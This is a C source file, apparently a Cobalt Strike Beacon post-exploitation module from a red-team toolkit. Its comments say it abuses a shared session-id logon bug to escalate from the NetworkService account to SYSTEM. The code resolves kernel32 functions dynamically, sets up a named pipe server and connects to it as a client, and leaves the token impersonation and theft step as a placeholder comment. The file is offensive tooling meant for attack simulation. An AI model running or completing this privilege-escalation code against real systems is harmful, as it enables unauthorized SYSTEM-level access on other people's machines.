/*!
 *
 * PostEx
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( CreateNamedPipeA );
	D_API( ConnectNamedPipe );
	D_API( GetLastError );
	D_API( CreateFileA );
	D_API( CloseHandle );
} API ;

/*!
 *
 * Purpose:
 *
 * Abuses the shared session-id logon bug to escalate
 * to SYSTEM from the NetworkService account. Clears
 * the impersonation token on success.
 *
!*/
void NetSvcGo( _In_ PCHAR Argv, _In_ INT Argc )
{
	API	Api;
	datap	Psr;

	PCHAR	Srv = NULL;
	PCHAR	Cli = NULL;

	HANDLE	K32 = NULL;
	HANDLE	Fle = NULL;
	HANDLE	Nps = NULL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Psr, sizeof( Psr ) );

	/* Extract arguments */
	BeaconDataParse( &Psr, Argv, Argc );
	Srv = BeaconDataExtract( &Psr, NULL );
	Cli = BeaconDataExtract( &Psr, NULL );

	/* Load kernel32.dll */
	K32 = LoadLibraryA( "kernel32.dll" );

	if ( K32 != NULL ) {

		/* Locate the required API's */
		Api.CreateNamedPipeA = C_PTR( GetProcAddress( K32, "CreateNamedPipeA" ) );
		Api.ConnectNamedPipe = C_PTR( GetProcAddress( K32, "ConnectNamedPipe" ) );
		Api.GetLastError     = C_PTR( GetProcAddress( K32, "GetLastError" ) );
		Api.CreateFileA      = C_PTR( GetProcAddress( K32, "CreateFileA" ) );
		Api.CloseHandle      = C_PTR( GetProcAddress( K32, "CloseHandle" ) );

		/* Create a named pipe server */
		if ( ( Nps = Api.CreateNamedPipeA(
				Srv, 
				FILE_FLAG_FIRST_PIPE_INSTANCE | PIPE_ACCESS_DUPLEX,
				PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
				1,
				0,
				0,
				NMPWAIT_USE_DEFAULT_WAIT,
				NULL ) ) != INVALID_HANDLE_VALUE )
		{
			/* Open the named pipe as a client */
			if ( ( Fle = Api.CreateFileA(
					Cli,
					GENERIC_READ | GENERIC_WRITE,
					0,
					NULL,
					OPEN_EXISTING,
					FILE_ATTRIBUTE_NORMAL,
					NULL ) ) != INVALID_HANDLE_VALUE ) 
			{
				/* Attempt to test if we have been connected yet! */
				if ( ! Api.ConnectNamedPipe( Nps, NULL ) && Api.GetLastError() == ERROR_PIPE_CONNECTED ) 
				{
					/* Success: Start working on impersonation & token theft */
				};
				Api.CloseHandle( Fle );
			};
			Api.CloseHandle( Nps );
		};
		/* Free dependency */
		FreeLibrary( K32 );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Psr, sizeof( Psr ) );
};
